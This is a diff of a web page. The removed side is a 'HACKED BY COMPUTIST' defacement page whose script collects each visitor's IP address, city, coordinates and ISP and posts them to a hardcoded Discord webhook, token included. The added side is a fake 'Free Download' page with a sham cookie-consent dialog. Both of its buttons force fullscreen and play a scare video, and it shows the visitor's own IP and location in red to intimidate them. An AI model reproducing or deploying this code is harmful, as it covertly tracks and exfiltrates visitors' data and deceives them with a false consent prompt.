@@ -1,103 +1,194 @@
 <!DOCTYPE html>
-<html>
-<center>
+<html lang="en">
 <head>
-    <title>HACKED BY COMPUTIST</title></title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Free Download</title>
+    <meta property="og:title" content="Free Download">
+    <meta property="og:site_name" content="Free Download">
+    <meta property="og:image" content="images/Parad1st.png">
+    <meta property="og:description" content="Free Download By Parad1st - скачать абсолютно бесплатно!">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="photo">
+    <meta name="twitter:title" content="Programm">
+    <meta name="twitter:site" content="@fps_boost">
+    <meta name="twitter:description" content="FREE!">
+    <meta name="twitter:image:src" content="Parad1st.png">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&amp;display=swap" rel="stylesheet">
+    <style>
+        p {
+            margin: 0;
+        }
+        *, *::before, *::after {
+            box-sizing: border-box;
+        }
+        .overlay, .scare {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100vh;
+            width: 100vw;
+        }
+        p.overlay-title {
+            font-size: 24px;
+            font-weight: 900;
+            color: black;
+            line-height: 1;
+            margin-bottom: 16px;
+        }
+        .overlay-button {
+            display: inline-flex;
+            align-items: center;
+            height: 40px;
+            padding-right: 24px;
+            padding-left: 24px;
+            font-size: 16px;
+            font-weight: 500;
+            line-height: 1;
+            border-radius: 4px;
+            margin: 4px;
+            cursor: pointer;
+        }
+        .overlay-buttons-wrapper {
+            margin: 24px -8px -8px;
+        }
+        #accept-button {
+            background-color: rgb(132, 94, 194);
+            color: white;
+        }
+        #decline-button {
+            color: rgb(132, 94, 194);
+            border: 2px solid rgb(132, 94, 194);
+        }
+        p.overlay-description {
+            font-size: 16px;
+            font-weight: 400;
+            color: rgba(0, 0, 0, 0.5);
+            line-height: 1.25;
+            margin-bottom: 16px;
+        }
+        a.overlay-link {
+            display: inline-block;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            color: rgb(132, 94, 194);
+            line-height: 1;
+            position: relative;
+            margin-top: 16px;
+        }
+        .overlay-body {
+            max-width: 512px;
+            text-align: center;
+            font-family: "Inter", sans-serif;
+        }
+        .overlay[hidden] {
+            display: none;
+        }
+        .overlay {
+            z-index: 2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f5f6fa;
+            padding-right: 24px;
+            padding-left: 24px;
+        }
+        .scare {
+            z-index: 1;
+        }
+        video#video {
+            height: 100%;
+            width: 100%;
+            object-fit: cover;
+        }
+        video#video::-webkit-media-controls-enclosure {
+            display: none !important;
+        }
+        #ipResult {
+            color: red;
+            font-size: 18px;
+            margin-top: 16px;
+        }
+        #jas {
+            display: block;
+            margin: 20px auto;
+        }
+    </style>
 </head>
 <body>
-
-<div id="result"></div>
-
-<!-- Add a title and an image -->
-<h2>ERROR</h2>
-<p>click below to retry<p/>
-    <div id="black"><button id="enter">Click to Enter Site</button></div>
-    <img id="jas" src="jas.png">
-
+<div id="overlay" class="overlay">
+    <div class="overlay-body">
+        <p class="overlay-title">Cookies и сторонний контент</p>
+        <p class="overlay-description">Этот сайт использует cookies что-бы собирать информацию об ошибках чтобы улучшить сайт и исправить ошибки. Приймите cookies для хорошей оптимальной производительности.</p>
+        <div class="overlay-buttons-wrapper">
+            <div id="accept-button" class="overlay-button">Принять</div>
+            <div id="decline-button" class="overlay-button">Отклонить</div>
+        </div>
+        <a href="https://t.me/aizen_softs" target="_blank" class="overlay-link">Пользовательское соглашение</a>
+    </div>
+</div>
+<div class="scare">
+    <video id="video" class="video" src="media/video.mp4" loop></video>
+</div>
 <div id="ipResult"></div>
-
+<img id="jas" src="jas.png" alt="Error Image">
 <script>
-function getMyIpAddress() {
-    fetch("https://api64.ipify.org?format=json")
-        .then(response => response.json())
-        .then(data => {
+    function getMyIpAddress() {
+        fetch("https://api64.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                fetch("https://ipinfo.io/" + data.ip + "/json")
+                    .then(response => response.json())
+                    .then(data => {
+                        var ipResultDiv = document.getElementById("ipResult");
+                        ipResultDiv.innerHTML = `
+                            <p><strong>IP Address:</strong> ${data.ip}</p>
+                            <p><strong>City:</strong> ${data.city}</p>
+                            <p><strong>Region:</strong> ${data.region}</p>
+                            <p><strong>Country:</strong> ${data.country}</p>
+                            <p><strong>Location:</strong> ${data.loc}</p>
+                            <p><strong>Organization:</strong> ${data.org}</p>
+                        `;
+                    })
+                    .catch(error => console.error("Error retrieving IP information:", error));
+            })
+            .catch(error => console.error("Error retrieving IP address:", error));
+    }
 
-            // Fetch geolocation data from ipinfo.io
-            fetch("https://ipinfo.io/" + data.ip + "/json")
-                .then(response => response.json())
-                .then(data => {
-                    var ipResultDiv = document.getElementById("ipResult");
-                    ipResultDiv.innerHTML = `
-                        <p><strong>IP Address:</strong> ${data.ip}</p>
-                        <p><strong>City:</strong> ${data.city}</p>
-                        <p><strong>Region:</strong> ${data.region}</p>
-                        <p><strong>Country:</strong> ${data.country}</p>
-                        <p><strong>Location:</strong> ${data.loc}</p>
-                        <p><strong>Organization:</strong> ${data.org}
-                    `;
+    const video = document.getElementById("video");
+    const overlay = document.getElementById("overlay");
+    const declineButton = document.getElementById("decline-button");
+    const acceptButton = document.getElementById("accept-button");
+    const jasImage = document.getElementById("jas");
 
-                    // Set hex color code and image URL
-                    var hexCode = "#903dfe"; // Replace with your desired hex color code
-                    var imageUrl = "https://cdn.discordapp.com/attachments/1321729826578763870/1322064016213934121/image.png?ex=676f8390&is=676e3210&hm=b6eea6b14f2ad193b8dec949cd7d3c1b4d2bdb1caa359107a96c3428469f4dd5&"; // Replace with your desired image URL
+    let hasClicked;
 
-                    // Send data to Discord webhook as an embed
-                    sendToDiscord(data, hexCode, imageUrl);
-                })
-                .catch(error => {
-                    var ipResultDiv = document.getElementById("ipResult");
-                    ipResultDiv.innerHTML = "<p>Error retrieving IP information.</p>";
-                    console.error("Error retrieving IP information:", error);
-                });
-        })
-        .catch(error => {
-            console.error("Error retrieving IP address:", error);
-        });
-}
+    function buttonClick(event) {
+        event.preventDefault();
+        if (!hasClicked) hasClicked = true;
+        overlay.hidden = true;
+        video.play();
+        videoClick();
+    }
 
-function sendToDiscord(data, hexCode, imageUrl) {
-    var webhookUrl = "https://discord.com/api/webhooks/1322061709237813308/2FqJOrZzknT70pqAxAW5_W4xrouRD7IMhZJ7FDKPXQlhVeP2AOxV11bEqbZODlSdqPrI"; // Replace with your actual webhook URL
-    var payload = {
-        embeds: [
-            {
-                fields: [
-                    { name: "IP Address", value: data.ip, inline: true },
-                    { name: "City", value: data.city, inline: true },
-                    { name: "Region", value: data.region, inline: true },
-                    { name: "Country", value: data.country, inline: true },
-                    { name: "Location", value: data.loc, inline: true },
-                    { name: "Organization", value: data.org, inline: true }
-                ],
-                color: parseInt(hexCode.replace("#", ""), 16),
-                image: { url: imageUrl },
-                timestamp: new Date().toISOString()
-            }
-        ]
-    };
+    function videoClick(event) {
+        if (event) event.preventDefault();
+        const { documentElement } = document;
+        if (documentElement.requestFullscreen) documentElement.requestFullscreen();
+        else if (documentElement.mozRequestFullScreen) documentElement.mozRequestFullScreen();
+        else if (documentElement.webkitRequestFullscreen) documentElement.webkitRequestFullscreen();
+        else if (documentElement.msRequestFullscreen) documentElement.msRequestFullscreen();
+    }
 
-    fetch(webhookUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log("Data sent to Discord successfully.");
-        } else {
-            console.error("Error sending data to Discord.");
-        }
-    })
-    .catch(error => {
-        console.error("Error sending data to Discord:", error);
+    document.addEventListener("DOMContentLoaded", function () {
+        getMyIpAddress();
     });
-}
 
-document.addEventListener("DOMContentLoaded", function() {
-    getMyIpAddress();
-});
+    acceptButton.addEventListener("click", buttonClick);
+    declineButton.addEventListener("click", buttonClick);
+    video.addEventListener("click", videoClick);
 </script>
-
 </body>
-</center>
 </html>
